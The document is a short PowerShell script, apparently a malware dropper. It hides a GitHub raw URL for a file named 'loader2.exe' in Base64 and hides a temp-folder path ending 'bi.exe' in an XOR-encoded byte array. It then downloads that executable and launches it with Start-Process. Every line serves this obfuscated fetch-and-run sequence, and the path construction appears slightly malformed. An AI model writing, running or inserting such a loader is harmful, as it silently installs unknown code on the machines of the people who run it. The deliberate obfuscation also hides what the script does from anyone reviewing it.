$url = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL3B1dGluMjIyMjIvdGVzdC9yYXcvcmVmcy9oZWFkcy9tYWluL2xvYWRlcjIuZXhl')))
$out = ($env + $($k4265=7;$b=[byte[]](0x3d,0x53,0x42,0x4a,0x57,0x5b,0x65,0x6e,0x29,0x62,0x7f,0x62);-join($b|%{[char]($_-bxor$k4265)})))
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process $out
